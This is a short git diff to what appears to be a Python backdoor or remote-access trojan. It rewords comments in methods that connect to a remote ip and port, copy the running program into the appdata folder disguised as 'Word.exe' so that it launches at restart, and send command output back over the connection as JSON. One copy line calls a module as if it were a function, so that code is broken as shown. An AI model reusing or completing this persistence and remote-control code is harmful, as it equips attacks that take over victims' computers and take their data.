@@ -23,7 +23,7 @@ class MotherFucker():
         self.connection.connect((ip, port))
 
     def persistence(self):
-        #Windows bullshit  adds it self to registery and starts fucking arount
+        # Adds it self to the Windows registery and launches when the machine restarts 
         if sys.platform == "win32" or sys.platform == "win64":
             location = os.environ["appdata"] + "\\Word.exe"
             shutil(sys.executable, location)
@@ -35,7 +35,7 @@ class MotherFucker():
             pass
 
     def json_send(self, data):
-        #Basically just dumps  output of commands   in a json  format and send it over
+        # Outputs commands in a json format and send it over
         json_data = json.dumps(data).encode('utf-8')
         self.connection.send(json_data)
 
